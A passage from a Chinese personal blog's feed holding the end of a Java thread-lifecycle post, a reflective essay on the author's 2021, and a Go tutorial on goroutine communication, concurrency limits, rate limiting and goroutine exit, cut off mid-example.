消费者A 从队列取走一个元素，队列当前有：1个元素
消费者B 从队列取走一个元素，队列当前有：0个元素
队列空，等待数据
生产者B 向队列取中插入一个元素，队列当前有：1个元素
消费者B 从队列取走一个元素，队列当前有：0个元素
生产者A 向队列取中插入一个元素，队列当前有：1个元素
消费者A 从队列取走一个元素，队列当前有：0个元素
...
...
</code></pre></div></div>

<h2 id="线程的生命周期">线程的生命周期</h2>

<p>一个线程对象只能调用一次<code class="language-plaintext highlighter-rouge">start()</code>方法，多次调用会抛出<code class="language-plaintext highlighter-rouge">IllegalThreadStateException</code>错误，并且新线程的<code class="language-plaintext highlighter-rouge">run（）</code>方法执行完毕，线程也就结束了，java的线程状态分为以下几种：</p>

<pre><code class="language-ascii">                               ┌─────────────┐
                               │     New     │
                               └─────────────┘
                                      │
                                      ▼
                      ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
                       ┌─────────────┐ ┌─────────────┐
                      ││  Runnable   │ │   Blocked   ││
                       └─────────────┘ └─────────────┘
                      │┌─────────────┐ ┌─────────────┐│
                       │   Waiting   │ │Timed Waiting│
                      │└─────────────┘ └─────────────┘│
                       ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
                                      │
                                      ▼
                               ┌─────────────┐
                               │ Terminated  │
                               └─────────────┘
</code></pre>

<ul>
  <li><strong>新建(New)</strong>：尚未调用<code class="language-plaintext highlighter-rouge">start()</code>的线程处于此状态。</li>
  <li><strong>就绪(Runnable)</strong>：已经调用了 <code class="language-plaintext highlighter-rouge">start</code> 方法的线程处于此状态。此状态意味着：<strong>线程已经在 JVM 中运行</strong>。但是在操作系统层面，线程可能处于running，也有可能处于ready，这取决于操作系统的资源调度。</li>
  <li><strong>阻塞(Blocked)</strong>：此状态表示线程在等待 <code class="language-plaintext highlighter-rouge">synchronized</code> 的隐式锁（Monitor lock）。<code class="language-plaintext highlighter-rouge">synchronized</code> 修饰的方法、代码块同一时刻只允许一个线程执行，其他线程只能等待，即处于阻塞状态。当占用 <code class="language-plaintext highlighter-rouge">synchronized</code> 隐式锁的线程释放锁，并且等待的线程获得 <code class="language-plaintext highlighter-rouge">synchronized</code> 隐式锁时，就又会从 <code class="language-plaintext highlighter-rouge">BLOCKED</code> 转换到 <code class="language-plaintext highlighter-rouge">RUNNABLE</code> 状态。</li>
  <li><strong>等待(Waiting)</strong>：；此状态意味着：<strong>线程无限期等待，直到被其他线程显式地唤醒</strong>。 阻塞和等待的区别在于，阻塞是被动的，它是在等待获取 <code class="language-plaintext highlighter-rouge">synchronized</code> 的隐式锁。而等待是主动的，通过调用 <code class="language-plaintext highlighter-rouge">Object.wait</code> 等方法进入。</li>
  <li><strong>定时等待(Timed Waiting)</strong>：此状态意味着：<strong>无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒</strong>。</li>
  <li><strong>终止(Terminated)</strong>：线程执行完 run 方法，或者因异常退出了 run 方法。此状态意味着：线程结束了生命周期。</li>
</ul>

<p>用@javacore的一幅图来表示：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/01/20220105172742.png" alt="img" /></p>

<h2 id="从bytecode看java并发">从bytecode看java并发</h2>

<p>好像考试周，只要干和考试无关的，都会非常有意思……</p>

<p>🐦🐦🐦🐦🐦🐦考完试再补</p>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">黄金时代——记在2022的前一天</title><link href="http://localhost:4000/2021/12/31/about2021.html" rel="alternate" type="text/html" title="黄金时代——记在2022的前一天" /><published>2021-12-31T00:00:00+08:00</published><updated>2021-12-31T00:00:00+08:00</updated><id>http://localhost:4000/2021/12/31/about2021</id><content type="html" xml:base="http://localhost:4000/2021/12/31/about2021.html"><![CDATA[<!--more-->

<h2 id="0x00-序">0x00 序</h2>

<p>今年的记忆很浅，浅的有时候，我需要去翻阅日记或者记录，才能确定一些事情是否真的发生；今年的回忆却很深，特别是下雨天，喜欢靠在在椅子上，看着窗外雨点打在树叶上的样子，或者沉沉的睡去。</p>

<p>不太想像去年一样按时间来记录，这样会感觉很流水账，事实上这篇文章我在12月初就陆陆续续有写，但也是陆陆续续的删去。</p>

<h2 id="0x01-技">0x01 技</h2>

<p>算是实习后保留下的习惯，会尝试做一些周报之类的东西来督促自己，效果也算得上差强人意。回望今年输出的文章，除去水文也就十余篇，可能每过一个阶段，就会对上一个阶段的自己不满意，文章也是如此。</p>

<p>抛开文章内容本身，我一直在想应该以一个什么样的身份来叙述一些东西，这无关是否会有读者来看我的文章。也可能是静态博客的原因，更多人把博客定位的是一个记录学习笔记的地方，读书笔记也好，刷的题也好，当然这没有问题。不过如果只是单纯笔记的话，我可能会考虑Notion或者印象笔记这类的工具。作为博客，我更希望这是可以和你们进行『交流』的地方，至少这不是没有感情的代码，如果可以产生共鸣那就更好了。所以我经常会带入『 我们 』这类的词到文章中。新的一年也希望站在前人的肩膀上写出一些更有深度的文章，当然还要把之前埋下的很多坑给填上。</p>

<p>明年的话，虽然有了努力的方向，还是需要更加明确才行。『回炉重造』是其中不可回避的一个话题，这方面的感悟主要是看到了这一篇<a href="https://csdiy.wiki/">文章</a>。有可能是对校内课堂的厌倦，我一直以来都差不多算是半个自学主义者。种一棵树最好的时间是十年前，其次是现在，希望可以坚持下去。</p>

<h2 id="0x02-情">0x02 情</h2>

<p>今年的记忆很浅，浅的我都有些忘记是怎么喜欢上了一个女生。</p>

<p>最初应该只是好感，不过我会想象和她的一些日常，比如一起吃饭，一起学习，散步等等，然后在幻想的美好中叠加好感，慢慢变成了喜欢，变成了可望不可得，对我来说每次开启话题就已经花费了所有的力气，因为我真的不会在网上和异性交流，现在想起来也算是幼稚和好笑。</p>

<p>大多时候我应该都是理性的，但也会被感性说服，过度期待，再变成失望，再回归平静。喜欢是自私的，一定意义上我只是一个想要强行闯入别人生活的陌生人，依靠的仅仅是心中的普信而已。</p>

<p>春天的花，开在冬天，就会被冻死。尽管一些朋友会和我说在正确的时间遇见对的人更加合适，不过这个概率并不值得我期待。如果可以为了那一个值得喜欢的人去迎合，去改变，这一切也算不上遗憾，未来，祝好。</p>

<h2 id="0x03-愿">0x03 愿</h2>

<p>意外的是，去年的愿望居然全部实现，只是读的书比往年都要少一些，零零散散读了：</p>

<ul>
  <li>《高效演讲》</li>
  <li>《山河之书》</li>
  <li><a href="https://weiyinfu.cn/MaoZeDongAnthology/">《毛泽东选集》</a></li>
  <li>《漂 下卷》</li>
  <li>《黄金时代》</li>
  <li>《彷徨之刃》</li>
</ul>

<p>不过对明年来说，并没有比较物质上的愿望，只希望爷爷身体健康，同时自己具备独当一面的能力，昨天比赛看见特等奖的队伍领了奖杯，但我们只有奖状，希望明年可以给社团也带来一些荣誉，和自身无关。</p>

<h2 id="0x04-尾">0x04 尾</h2>

<p>为什么我想用“黄金时代”来描述这一年呢？</p>

<p>在这一年的年底之前，我一直处于寻找“答案”的阶段，尽管到现在我也不知道“答案”的问题到底是什么。只是好像未来的生活，一眼就看到了尽头，但我并没有学会在一成不变的事情中调整心态。</p>

<p>焦虑是今年比较大的主旋律，所以我一直在追赶，想用滑板来节省从宿舍到图书馆，到活动室的时间，但实际上节约的几分钟时间，远比上我每天看风景发呆的时间。这一切无意义的求索，让周围的人感觉我特立独行，到头来也错过了很多。</p>

<p>意识到这一点后，我索性把滑板收了起来，步行还是可以感受到之前错过的东西，比如每天6点左右图书馆前的晚霞，漂泊不定的云，还有时不时走在你腿边撒娇的流浪猫。当然这些都会有男男女女拍照留恋，我有时也会加入其中。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/01/20220114005255.jpg" alt="4F2E279685577707342ED3D01C58611E" /></p>

<p>回顾这一年的点点滴滴，我还是很幸福的。家人和老师永远给我鼓励，累了烦了，一通消息就有朋友出去吃吃喝喝。只是不知道为什么写这些总有一种稍纵即逝的感觉，还是希望在学校的日子时间可以过得慢一些吧，至少可以让我回忆的时候不那么费劲。</p>

<p>生活就是这样一个慢慢受锤的过程，我也享受其中乐此不疲。小时候总说长大想过一份安逸的生活，随着年龄的增长，发现可能还是陌生的环境更加适合我，也或许我本身就是一个适应性很强的人。</p>

<blockquote>
  <p>那一天我二十一岁，在我一生的黄金时代。我有好多奢望。我想爱，想吃，还想在一瞬间变成天上半明半暗的云。后来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。我觉得自己会永远生猛下去，什么也锤不了我。</p>

  <p>​																						———王小波 《黄金时代》</p>
</blockquote>

<p>写到这，已经是31日的下午，自考研大军离开后，图书馆终于算是想来就来的状态。回想起平安夜那天，徐州迎来了2021的第一场雪，雪总是可以带来很多美好的回忆。今晚还是和朋友出去跨年，只是有一些人已经少了很多联系。</p>

<p>不管怎么说，也祝你元旦快乐。</p>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><category term="essay" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">go并发的几个问题</title><link href="http://localhost:4000/2021/12/02/concurrent-in-go.html" rel="alternate" type="text/html" title="go并发的几个问题" /><published>2021-12-02T23:30:20+08:00</published><updated>2021-12-02T23:30:20+08:00</updated><id>http://localhost:4000/2021/12/02/concurrent-in-go</id><content type="html" xml:base="http://localhost:4000/2021/12/02/concurrent-in-go.html"><![CDATA[<h2 id="前言">前言</h2>

<p>作为世界上除了PHP之外最好的语言golang，只需<code class="language-plaintext highlighter-rouge">go</code>关键字修饰函数，就可以直接启动一个goroutine(协程)运行，但在实际的场景中，我们需要考虑到协程的数量，其之间的同步与通信，以及精确控制其结束。</p>

<!--more-->

<h2 id="如何控制协程的通信">如何控制协程的通信</h2>

<h3 id="引入全局变量">引入全局变量</h3>

<p>这是最简单也是最容易想到的方法：虽然goroutine的退出只能由其自身的决定，不允许从外部直接控制，不过我们可以通过引入全局变量，所有的goroutine都共享这个变量，并且不断寻查其是否更新，在主程序中对其更改，goroutine勘测到其变化后做出反应。</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
<span class="k">import</span> <span class="p">(</span>
	<span class="s">"fmt"</span>
	<span class="s">"time"</span>
<span class="p">)</span>
<span class="k">var</span> <span class="n">running</span> <span class="kt">bool</span>
<span class="k">func</span> <span class="n">run</span><span class="p">()</span>  <span class="p">{</span>
	<span class="k">for</span> <span class="n">running</span>  <span class="p">{</span>
		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"running"</span><span class="p">)</span>
		<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="m">500</span><span class="o">*</span><span class="n">time</span><span class="o">.</span><span class="n">Millisecond</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"stop now"</span><span class="p">)</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">(){</span>
	<span class="n">running</span><span class="o">=</span><span class="no">true</span>
	<span class="k">go</span> <span class="n">run</span><span class="p">()</span>
	<span class="k">go</span> <span class="n">run</span><span class="p">()</span>
	<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
	<span class="n">running</span><span class="o">=</span><span class="no">false</span>
	<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
<span class="p">}</span>

<span class="c">/*
out:
running
running
running
running
stop now
stop now
*/</span>
</code></pre></div></div>

<p>这种写法看似很简单，但是还是有好几个问题：</p>

<ol>
  <li>全局变量存在数据同步问题，如果有多个写入需要加锁处理。</li>
  <li>协程之间的通信量很小，只有事先定义的全局变量，并且只能单向从主程序通知给协程。</li>
</ol>

<h3 id="利用channel通信">利用channel通信</h3>

<p>相信写go的兄弟，一定对这一句话不陌生：</p>

<blockquote>
  <p>Go语言的并发模型是CSP（Communicating Sequential Processes）通信顺序进程，提倡通过通信共享内存而不是通过共享内存而实现通信。</p>
</blockquote>

<p>这里简单谈谈我的理解:</p>

<p>共享内存是什么?如果在一个系统中，不同进程或者线程共享一块内存，那么他们之间不需要进行平凡的交互，如果有大量的数据传输，也省去了数据拷贝的消耗。</p>

<table>
  <tbody>
    <tr>
      <td>但是这有一个很大的问题，就是多线程下，共享一块内存，肯定会存在数据冲突。为了对抗这种冲突，人们发明了很多机制，比如加锁，信号量，各种调度算法等等，但是这毫无都会对并发的性能造成影响。(但并不是说全部都不行，比如[深度</td>
      <td>字节跳动微服务架构体系演进](https://zhuanlan.zhihu.com/p/382833278)）</td>
    </tr>
  </tbody>
</table>

<p>最终“通过通信来实现进程/线程间交互”的方案脱颖而出,go就在语言层提供了channel来实现这一方案，简单理解就是设计的时候，对于消息队列，只提供读写接口，而对于内部的实现你完全不用去在意，看起来消息队列就像是共享内存一样了。然而你的消息队列可以利用socket进行通信。</p>

<p>通过看channel的源码，可以看出它其实就是一个队列加一个轻量锁</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">type</span> <span class="n">hchan</span> <span class="k">struct</span> <span class="p">{</span>
   <span class="n">qcount</span>   <span class="kt">uint</span>           <span class="c">// total data in the queue</span>
   <span class="n">dataqsiz</span> <span class="kt">uint</span>           <span class="c">// size of the circular queue</span>
   <span class="n">buf</span>      <span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span> <span class="c">// points to an array of dataqsiz elements</span>
   <span class="n">elemsize</span> <span class="kt">uint16</span>
   <span class="n">closed</span>   <span class="kt">uint32</span>
   <span class="n">elemtype</span> <span class="o">*</span><span class="n">_type</span> <span class="c">// element type</span>
   <span class="n">sendx</span>    <span class="kt">uint</span>   <span class="c">// send index</span>
   <span class="n">recvx</span>    <span class="kt">uint</span>   <span class="c">// receive index</span>
   <span class="n">recvq</span>    <span class="n">waitq</span>  <span class="c">// list of recv waiters</span>
   <span class="n">sendq</span>    <span class="n">waitq</span>  <span class="c">// list of send waiters</span>

   <span class="c">// lock protects all fields in hchan, as well as several</span>
   <span class="c">// fields in sudogs blocked on this channel.</span>
   <span class="c">//</span>
   <span class="c">// Do not change another G's status while holding this lock</span>
   <span class="c">// (in particular, do not ready a G), as this can deadlock</span>
   <span class="c">// with stack shrinking.</span>
   <span class="n">lock</span> <span class="n">mutex</span>
<span class="p">}</span>
</code></pre></div></div>

<p>再谈谈select机制，可以理解为select, poll, epoll 相似的功能：监听多个描述符的读/写等事件，属于基于事件的并发处理(欸好像和之前看csapp第12章的知识连起来了)，简单来说就是监听多个channel，每一个case都是一个事件，按照先后(如果相同则随机)执行，如果没监听的事件暂时堵塞则会执行default。</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
   <span class="s">"fmt"</span>
   <span class="s">"time"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">output1</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="k">chan</span> <span class="kt">string</span><span class="p">,</span> <span class="m">5</span><span class="p">)</span>
   <span class="k">go</span> <span class="n">write</span><span class="p">(</span><span class="n">output1</span><span class="p">)</span>
   <span class="k">for</span> <span class="n">s</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">output1</span> <span class="p">{</span>
      <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"res:"</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
      <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="o">*</span><span class="m">2</span><span class="p">)</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">write</span><span class="p">(</span><span class="n">ch</span> <span class="k">chan</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="n">ch</span> <span class="o">&lt;-</span> <span class="s">"hello"</span><span class="o">:</span>
         <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"write hello"</span><span class="p">)</span>
      <span class="k">default</span><span class="o">:</span>
         <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"channel full"</span><span class="p">)</span>
      <span class="p">}</span>
      <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Millisecond</span> <span class="o">*</span> <span class="m">500</span><span class="p">)</span>
   <span class="p">}</span>
<span class="p">}</span>
<span class="c">/*
write hello
res: hello
write hello
write hello
write hello
res: hello
write hello
write hello
write hello
channel full
......
*/</span>
</code></pre></div></div>

<h2 id="控制并发量">控制并发量</h2>

<p>准备写这里的时候，在知乎上看到一个老哥说可以通过<code class="language-plaintext highlighter-rouge">runtime.GOMAXPROCS(n)</code>直接修改最大线程数…</p>

<p>这是对并发和并行没有弄清楚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>多线程程序在一个核的cpu上运行，就是并发。
多线程程序在多个核的cpu上运行，就是并行。
</code></pre></div></div>

<p>当一个函数创建为goroutine时，编译器会将其视为一个独立的工作单元。这个单元会被调度到<strong>可用的逻辑处理器</strong>（可用的核数）上执行。线程是和逻辑处理器绑定的。而<code class="language-plaintext highlighter-rouge">runtime.GOMAXPROCS(n)</code>就是分配n个逻辑处理器。但我们这里谈并发，还是在一个偏<del>微观</del>的层面，可以说这个回答是毫无相关了。</p>

<p>我们首先看看过高的并发会导致什么问题：</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"fmt"</span>
	<span class="s">"math"</span>
	<span class="s">"sync"</span>
	<span class="s">"time"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">var</span> <span class="n">wg</span> <span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span>
	<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">math</span><span class="o">.</span><span class="n">MaxInt32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
		<span class="n">wg</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="m">1</span><span class="p">)</span>
		<span class="k">go</span> <span class="k">func</span><span class="p">(</span><span class="n">i</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">defer</span> <span class="n">wg</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
			<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
		<span class="p">}(</span><span class="n">i</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">wg</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>panic: too many concurrent operations on a single file or socket (max 1048575)

goroutine 1127972 [running]:
internal/poll.(*fdMutex).rwlock(0xc000110280, 0x113500, 0x7600000001)
        D:/go/src/internal/poll/fd_mutex.go:147 +0x146
internal/poll.(*FD).writeLock(...)
        D:/go/src/internal/poll/fd_mutex.go:239
internal/poll.(*FD).Write(0xc000110280, 0xc17470e5f0, 0x8, 0x8, 0x0, 0x0, 0x0)
</code></pre></div></div>

<p>报错是由<code class="language-plaintext highlighter-rouge">fmt.println</code>引起的，对单个 file/socket 的并发操作个数超过了系统上限，那如果我们把<code class="language-plaintext highlighter-rouge">fmt.println</code>换成并发安全的<code class="language-plaintext highlighter-rouge">log.println</code>呢？</p>

<p>运行后，goland直接退出，chrome浏览器也闪退。每个协程至少需要消耗 2KB 的空间，在骤减的内存空间下，程序运行很容易崩溃，总而言之就是并发的控制不当导致系统的资源被耗尽了。</p>

<p>不同的应用程序对资源的需求是不同的，比如如果是并发对本地资源的操作，那么应该需要考虑系统资源的承受能力；如果是对外端口扫描、密码破解，那还需要考虑会不会触发风控警告等等。总之，并发的上限应该由程序主动控制。</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
   <span class="s">"log"</span>
   <span class="s">"sync"</span>
   <span class="s">"time"</span>
<span class="p">)</span>
<span class="k">func</span> <span class="n">crack</span><span class="p">(</span><span class="n">taskChan</span> <span class="k">chan</span> <span class="kt">int</span><span class="p">,</span><span class="n">wg</span> <span class="o">*</span><span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span><span class="p">){</span>
   <span class="k">for</span> <span class="n">task</span><span class="o">:=</span><span class="k">range</span> <span class="n">taskChan</span><span class="p">{</span>
      <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"crack: "</span><span class="p">,</span><span class="n">task</span><span class="p">)</span>
      <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
      <span class="n">wg</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
   <span class="p">}</span>
<span class="p">}</span>
<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="k">var</span> <span class="n">wg</span> <span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span>
   <span class="n">threat</span><span class="o">:=</span><span class="m">10</span>
   <span class="n">taskChan</span><span class="o">:=</span><span class="nb">make</span><span class="p">(</span><span class="k">chan</span> <span class="kt">int</span><span class="p">,</span><span class="n">threat</span><span class="p">)</span>
   <span class="k">for</span> <span class="n">i</span><span class="o">:=</span><span class="m">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">threat</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">{</span>
      <span class="k">go</span> <span class="n">crack</span><span class="p">(</span><span class="n">taskChan</span><span class="p">,</span><span class="o">&amp;</span><span class="n">wg</span><span class="p">)</span>
   <span class="p">}</span>

   <span class="k">for</span> <span class="n">i</span><span class="o">:=</span><span class="m">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="m">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">{</span>
      <span class="n">wg</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="m">1</span><span class="p">)</span>
      <span class="n">taskChan</span><span class="o">&lt;-</span><span class="n">i</span>
   <span class="p">}</span>
   <span class="n">wg</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
   <span class="nb">close</span><span class="p">(</span><span class="n">taskChan</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>上面这个实例很好理解，相当于创建了10个并发的crack消费者，range感知taskChan的变化，再通过一个for依次把目标输送给goroutine。</p>

<p>实际上，除了控制并发之外，有时候我们还需要控制发包的速率，避免过快触发警告，可以利用<code class="language-plaintext highlighter-rouge">time.NewTicker(rateLimit)</code>计时器来控制发包</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"log"</span>
	<span class="s">"time"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">(){</span>
  <span class="n">rate</span><span class="o">:=</span><span class="m">10</span>
  <span class="n">rateLimit</span><span class="o">:=</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="o">/</span><span class="n">time</span><span class="o">.</span><span class="n">Duration</span><span class="p">(</span><span class="n">rate</span><span class="p">)</span>
  <span class="n">ticker</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">NewTicker</span><span class="p">(</span><span class="n">rateLimit</span><span class="p">)</span>
  <span class="n">worker</span><span class="o">:=</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">{</span>
      <span class="o">&lt;-</span><span class="n">ticker</span><span class="o">.</span><span class="n">C</span>
      <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"ok"</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">go</span> <span class="n">worker</span><span class="p">()</span>
  <span class="k">go</span> <span class="n">worker</span><span class="p">()</span>
  <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="o">*</span><span class="m">10</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>但如果在实际工程的时候，需要考虑一些问题。比如如果是多ip的扫描，应该给每个ip分发一个ticker而不是共享，不然对效率会有比较大的损失。</p>

<h2 id="退出协程的几种方式">退出协程的几种方式</h2>

<p>关于协程，我们不仅要关注创建和通信，还要关注如何合理的退出。当然之前说到全局变量的确可以，但是不推荐，以下讲述三种方式退出协程。</p>

<h3 id="for-range退出">for-range退出</h3>

<p>之前说过range可以感知channel的变化，如果协程只从一个channel中读取数据，那么下列的程序即可主动退出协程</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">main</span><span class="p">(){</span>
   <span class="n">channel</span><span class="o">:=</span><span class="nb">make</span> <span class="p">(</span><span class="k">chan</span> <span class="kt">int</span><span class="p">)</span>
   <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">defer</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"exit"</span><span class="p">)</span>
      <span class="k">for</span> <span class="n">x</span><span class="o">:=</span><span class="k">range</span> <span class="n">channel</span><span class="p">{</span>
         <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
      <span class="p">}</span>
   <span class="p">}()</span>

   <span class="k">for</span> <span class="n">i</span><span class="o">:=</span><span class="m">1</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="m">10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">{</span>
      <span class="n">channel</span><span class="o">&lt;-</span><span class="n">i</span>
      <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="m">5</span><span class="p">{</span>
         <span class="nb">close</span><span class="p">(</span><span class="n">channel</span><span class="p">)</span>
         <span class="k">break</span>
      <span class="p">}</span>
   <span class="p">}</span>
   <span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="select退出">select退出</h3>

<p>上述只是针对单个channel的读取，select的多路复用可以处理多个chanel，但是其并不能感知channel的关闭，会一直读取到0值。因为关闭的channel可以读取，但是写入会引发panic。不过我们可以用<code class="language-plaintext highlighter-rouge">,ok</code>来解决这个问题。</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">defer</span> <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"exit"</span><span class="p">)</span>
		<span class="k">for</span> <span class="p">{</span>
			<span class="k">select</span> <span class="p">{</span>
			<span class="k">case</span> <span class="n">x</span><span class="p">,</span><span class="n">ok</span><span class="o">:=&lt;-</span><span class="n">in</span><span class="o">:</span>
				<span class="k">if</span> <span class="o">!</span><span class="n">ok</span> <span class="p">{</span>
					<span class="k">return</span>
				<span class="p">}</span>
				<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"continue"</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="n">other</span><span class="o">:</span>
				<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"continue"</span><span class="p">)</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}()</span>
</code></pre></div></div>

<p>上述的例子只要channel in关闭则会主动退出协程。但还是存在多个channel，如果有指定个channel退出，则退出协程的情况，这里要用到<strong>select不会在nil的通道上进行等待</strong>，所以我们可以把关闭的通道全部设置为nil，在循环底部加上判断即可。</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">{</span>
      <span class="k">select</span> <span class="p">{</span>
      <span class="k">case</span> <span class="n">x</span><span class="p">,</span> <span class="n">ok</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="n">in1</span><span class="o">:</span>
         <span class="k">if</span> <span class="o">!</span><span class="n">ok</span> <span class="p">{</span>
            <span class="n">in1</span> <span class="o">=</span> <span class="no">nil</span>
         <span class="p">}</span>
      <span class="k">case</span> <span class="n">y</span><span class="p">,</span> <span class="n">ok</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="n">in2</span><span class="o">:</span>
